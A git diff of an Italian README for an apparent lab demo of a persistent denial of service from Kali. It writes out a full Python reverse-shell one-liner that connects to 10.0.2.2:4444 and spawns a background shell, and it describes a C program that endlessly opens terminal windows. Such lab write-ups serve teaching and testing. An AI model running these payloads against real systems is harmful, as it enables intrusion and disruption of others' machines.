@@ -9,9 +9,15 @@ L'obiettivo della demo è di creare un Denial of Service persistente su una macc
 ## Preparazione Kali
 Per prima cosa sono stati creati tutti i file necessari su Kali.
 Per primo il file `reverseshell.sh`, dove è presente il [payload](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl) in python 
-<pre>
-export RHOST="10.0.2.2";export RPORT=4444;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")&'
-</pre>
+```js
+export RHOST="10.0.2.2";
+export RPORT=4444;
+python3 -c 'import socket,os,pty;
+s=socket.socket();
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
+pty.spawn("/bin/sh")&'
+```
 che permette di creare una reverse shell in background quando eseguito sulla macchina attaccata.
 Poi, è stato creato un semplicissimo programma in C, `dos.c`, contenente un ciclo while infinito che continua ad aprire finestre di terminale:
 ```js
